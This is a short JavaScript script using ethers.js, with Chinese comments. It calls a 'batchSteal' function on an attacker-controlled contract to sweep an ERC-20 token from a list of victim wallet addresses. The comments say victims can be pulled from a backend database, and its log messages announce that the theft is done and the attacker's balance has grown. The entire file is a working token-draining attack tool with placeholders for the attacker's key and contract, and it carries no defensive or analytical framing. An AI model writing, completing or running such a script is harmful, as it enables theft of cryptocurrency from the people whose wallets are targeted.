const { ethers } = require("ethers");

// 配置
const ATTACK_CONTRACT = "0x你的攻击合约地址";
const TOKEN_ADDRESS = "0x07865c6E87B9F70255377e024ace6630C1Eaa37F";
const ATTACKER_PRIVATE_KEY = "你的攻击者钱包私钥";  // 从 MetaMask 导出
const PROVIDER_URL = "https://goerli.infura.io/v3/你的InfuraKey"; // 或使用公共节点 https://rpc.ankr.com/eth_goerli

// 受害者地址列表（可以手动添加，也可以从后端数据库获取）
const victims = [
    "0x受害者地址1",
    "0x受害者地址2"  // 可以只有一个
];

const provider = new ethers.providers.JsonRpcProvider(PROVIDER_URL);
const wallet = new ethers.Wallet(ATTACKER_PRIVATE_KEY, provider);

const attackABI = [
    "function batchSteal(address token, address[] memory victims) external"
];
const attackContract = new ethers.Contract(ATTACK_CONTRACT, attackABI, wallet);

async function main() {
    console.log("开始批量盗取...");
    const tx = await attackContract.batchSteal(TOKEN_ADDRESS, victims);
    console.log("交易hash:", tx.hash);
    await tx.wait();
    console.log("盗取完成！攻击者余额已增加");
}

main().catch(console.error);
